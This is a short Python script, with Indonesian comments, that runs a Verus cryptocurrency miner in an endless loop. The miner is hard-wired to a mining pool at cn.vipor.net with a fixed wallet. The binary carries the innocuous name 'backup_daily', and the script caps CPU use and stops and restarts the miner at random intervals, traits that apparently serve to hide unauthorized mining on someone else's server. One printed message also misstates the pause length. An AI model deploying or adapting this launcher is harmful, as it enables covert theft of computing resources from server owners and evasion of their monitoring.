import os
import subprocess
import time
import random

def get_numa_info():
    """Mengambil informasi NUMA node dan CPU yang tersedia"""
    try:
        result = subprocess.run(["numactl", "--hardware"], capture_output=True, text=True)
        lines = result.stdout.split("\n")
        numa_info = {}

        for line in lines:
            if "node" in line and "cpus" in line:
                parts = line.split()
                node_id = int(parts[1])
                cpu_list = [int(cpu) for cpu in parts[3:]]
                numa_info[node_id] = cpu_list
        
        return numa_info
    except Exception as e:
        print(f"Error mendapatkan info NUMA: {e}")
        return {}

def start_mining(numa_node=0, limit_percent=80, cpu_usage_limit=80, command="./backup_daily -a verus -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x -t 112"):
    """Menjalankan proses mining dengan NUMA terbatas, CPU limit, dan auto-restart jika mati"""
    numa_info = get_numa_info()
    
    if numa_node not in numa_info:
        print(f"NUMA node {numa_node} tidak ditemukan!")
        return
    
    # Hitung jumlah CPU yang digunakan (80% dari total CPU pada NUMA node)
    total_cpus = len(numa_info[numa_node])
    limited_cpus = max(1, int((limit_percent / 100) * total_cpus))  # Minimal 1 CPU
    
    # Pilih CPU yang digunakan
    selected_cpus = ",".join(map(str, numa_info[numa_node][:limited_cpus]))
    
    print(f"Menjalankan '{command}' pada NUMA node {numa_node} dengan {limited_cpus}/{total_cpus} CPU ({limit_percent}%)")
    
    while True:
        # Jalankan proses mining dengan NUMA dan CPU binding
        process = subprocess.Popen(f"numactl --cpunodebind={numa_node} --membind={numa_node} taskset -c {selected_cpus} {command}", shell=True)
        
        # Batasi penggunaan CPU setiap core ke 80% dengan cpulimit
        os.system(f"cpulimit -p {process.pid} -l {cpu_usage_limit} &")
        
        # Jalankan mining selama waktu acak antara 55-60 detik
        sleep_time = random.randint(55, 60)
        time.sleep(sleep_time)
        
        # Hentikan proses mining
        process.terminate()
        process.wait()
        
        print(f"Mining dihentikan selama {sleep_time} detik. Melanjutkan dalam 10 detik...")
        time.sleep(5)

# Jalankan mining dengan auto stop setiap 55-60 detik
start_mining(numa_node=0, limit_percent=80, cpu_usage_limit=80)
